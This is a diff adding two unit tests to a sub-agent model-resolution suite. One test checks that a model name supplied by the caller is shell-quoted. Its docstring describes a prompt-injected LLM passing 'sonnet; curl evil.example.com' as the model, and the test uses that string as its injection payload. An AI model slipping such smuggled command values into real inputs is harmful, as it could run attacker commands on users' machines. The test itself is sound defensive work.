@@ -191,6 +191,34 @@ class TestSubAgentModelResolution(unittest.IsolatedAsyncioTestCase):
         self.assertNotIn("--model claude-sonnet-4-6", cmd)
         self.assertIn("**Model:** sonnet", result)
 
+    async def test_none_model_falls_back_to_sonnet(self):
+        """None (not just empty string) falls back to claude-sonnet-4-6.
+
+        The `if not model:` guard at sub_agent entry coerces None to
+        SUB_AGENT_DEFAULT_MODEL before the resolver runs, same as "".
+        """
+        cmd, result = await self._run_sub_agent_and_capture(None)
+        self.assertIn("--model claude-sonnet-4-6", cmd)
+        self.assertIn("**Model:** sonnet", result)
+
+    async def test_model_argument_is_shell_quoted(self):
+        """Caller-supplied model must land as a shlex-quoted CLI argument.
+
+        Phase 3 widened the accepted input from two hardcoded aliases to any
+        caller-supplied string. A prompt-injected LLM could pass
+        "sonnet; curl evil.com" as the model; the command builder must
+        single-quote the value so the shell never evaluates metacharacters.
+        """
+        injection = "sonnet; curl evil.example.com"
+        cmd, _ = await self._run_sub_agent_and_capture(injection)
+        # The whole injected string must be a single shell-quoted argument
+        # to --model. shlex.quote wraps anything with shell metachars in single
+        # quotes — assert that exact form appears in the command line.
+        self.assertIn("--model 'sonnet; curl evil.example.com'", cmd)
+        # Defensive: the dangerous trailing fragment must NOT appear as a
+        # bare (unquoted) suffix that the shell could execute.
+        self.assertNotIn("--model sonnet; curl", cmd)
+
 
 if __name__ == "__main__":
     unittest.main()
